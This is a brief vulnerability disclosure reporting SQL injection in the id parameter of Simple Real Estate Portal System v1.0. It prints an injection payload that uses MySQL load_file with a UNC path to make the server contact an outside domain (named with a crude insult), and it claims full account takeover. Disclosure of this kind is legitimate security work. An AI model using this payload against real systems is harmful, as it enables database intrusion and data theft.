## Title: Simple Real Estate Portal System v1.0 remote SQL-Injections
## Author: nu11secur1ty
## Vendor: https://www.sourcecodester.com/users/tips23
## Software: https://www.sourcecodester.com/php/15184/simple-real-estate-portal-system-phpoop-free-source-code.html


## Description:
The id parameter appears to be vulnerable to SQL injection attacks.
The payload '+(select
load_file('\\\\2bej8mzxoxsqpel4hbll4ar23t9mxjlaoyfl69v.http://stupid_asshole.com\\foh'))+'
was submitted in the id parameter.
This payload injects a SQL sub-query that calls MySQL's load_file
function with a UNC file path that references a URL on an external
domain.
The application interacted with that domain, indicating that the
injected SQL query was executed.
The attacker from outside can take control of all accounts of this
system by using this vulnerability!
WARNING: If this is in some external domain, or some subdomain, or
internal, this will be extremely dangerous!
Status: CRITICAL
